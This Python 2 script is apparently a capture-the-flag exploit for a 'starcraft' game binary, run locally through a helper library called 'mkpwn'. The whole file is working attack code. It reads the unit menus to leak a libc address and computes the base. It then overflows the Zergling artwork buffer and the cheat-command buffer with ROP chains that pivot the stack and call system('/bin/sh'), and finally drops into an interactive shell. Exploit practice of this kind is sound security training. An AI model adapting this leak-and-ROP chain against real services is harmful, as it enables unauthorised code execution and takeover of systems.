#!/usr/bin/env python2.7
# -*- coding:utf-8 -*-
from mkpwn import *
import ctypes

# settings
local   = True
debug   = False

if local:
    target  = './starcraft'
else:
    target  = ('0', 0)

# get io
io  = mk(target, debug)

# Marine    <- Terran   <- Unit
# Firebat   <- Terran   <- Unit
# Ghost     <- Terran   <- Unit
# Zealot    <- Protess  <- Unit
# Dragon    <- Protess  <- Unit

# Zergling  <- Zerg     <- Unit     (vuln: overflow)
# Ultralisk <- Zerg     <- Unit
# Hydralisk <- Zerg     <- Unit

# Arcon     <- Protess  <- Unit
# Templar   <- Protess  <- Unit     (vuln: leak)

# global
offset_exit         = 0x000000000003c290
offset_system       = 0x0000000000046640
offset_str_bin_sh   = 0x17ccdb
offset_gadget0      = 0x0003724c    # add rsp, 0x0000000000000108 ; ret  ;  (2 found)
offset_gadget1      = 0x00022b1a    # pop rdi ; ret  ;  (506 found)
libc_exit           = 0x0
libc_system         = 0x0
libc_str_bin_sh     = 0x0
libc_gadget0        = 0x0
libc_gadget1        = 0x0
libc_base           = 0x0

def leak(base):
    global libc_system
    global libc_str_bin_sh
    global libc_gadget0
    global libc_gadget1
    libc_str_bin_sh = base + offset_str_bin_sh
    libc_system     = base + offset_system
    libc_gadget0    = base + offset_gadget0
    libc_gadget1    = base + offset_gadget1

# exp
def exp():
    io.ru('9. Ultralisk')
    io.pr('6')
    io.ru('select attack option')
    io.pr('1')
    io.ru('select attack option')
    io.pr('2')

    # leak libc
    io.ru('is burrowed : ')
    part1 = ctypes.c_uint32(int(io.rl()[:-1])).value
    io.ru('is burrow-able? : ')
    part2 = ctypes.c_uint32(int(io.rl()[:-1])).value
    libc_exit       = (part2 << 0x20) + part1
    libc_base       = libc_exit - offset_exit
    leak(libc_base)
    info_found('libc base', libc_base)

    stage_count     = 1
    payload1_shoot  = False
    payload2_shoot  = False
    while True:
        line = io.rl()
        if 'option' in line:
            if stage_count >= 12 and not payload1_shoot:
                io.pr('1')
                io.ru('artwork')
                payload1  = 'A' * 0x108
                payload1 += l64(libc_gadget0)
                payload1 += l64(0x0)
                io.pr(payload1)
                payload1_shoot  = True
            else:
                io.pr('0')
        elif 'win' in line:
            if stage_count >= 12:
                if not payload2_shoot:
                    io.ru('wanna cheat? (yes/no)')
                    io.pr('yes')
                    io.ru('your command :')
                    payload2  = 'A' * 0x10
                    payload2 += l64(libc_gadget1)
                    payload2 += l64(libc_str_bin_sh)
                    payload2 += l64(libc_system)
                    io.pr(payload2)
                    payload2_shoot  = True
                else:
                    io.ru('wanna cheat? (yes/no)')
                    io.pr('no')
        elif 'Stage' in line:
            stage_count += 1
            print 'stage_count ... ... %d' % stage_count
        elif 'arcon is dead' in line :
            if payload1_shoot and payload2_shoot:
                io.hint([0x0000555555554000 + 0x2d64])
                io.ru('cheat...?')
                io.pr(1)
                info_shell()
                io.interact()
            else:
                print 'sorry, i will try again ...'
                return 0


    while True:
        line = io.rl()

    
    io.interact()

# main
if __name__ == '__main__':
    io = mk(target, debug)
    while not exp():
        io = mk(target, debug)
        pass

